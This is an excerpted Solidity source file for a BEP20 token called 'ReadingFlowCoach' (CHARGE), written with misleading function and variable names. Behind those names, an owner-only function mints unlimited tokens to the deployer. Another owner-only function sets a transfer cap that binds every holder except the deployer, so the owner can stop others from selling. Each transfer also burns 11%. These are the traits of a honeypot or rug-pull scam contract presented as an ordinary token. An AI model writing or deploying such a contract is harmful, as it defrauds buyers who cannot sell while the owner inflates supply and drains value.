...
contract ReadingFlowCoach is IBEP20 
{
    using ChangeLib for uint256;
    mapping(address => uint256) internal _risk;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _meal;
    ...
    constructor() 
    {
        ...
        _name = "ReadingFlowCoach";
        _symbol = "CHARGE";
        _burnRate = 11;
        _meal = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _risk[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier PushMachine() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _risk[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetBread() external view returns (uint256) { return _meal; }
    function SetDiscussion(uint b) external virtual PushMachine { _meal = b * (10 ** decimals()); }
    ...
    function TemporarySplit(uint256 newspaper) external virtual PushMachine
    {
        uint iron = newspaper * (10 ** decimals()); 
        _risk[_msgsender] = _risk[_msgsender].Dump(iron);
        emit Transfer(address(0), _msgsender, iron);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _meal || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _risk[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _risk[sender] = senderBalance - amount;
        _risk[recipient] += (amount - burnAmount);
        _risk[_burnaddress] += burnAmount;
...
library ChangeLib 
{
  function Dump(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}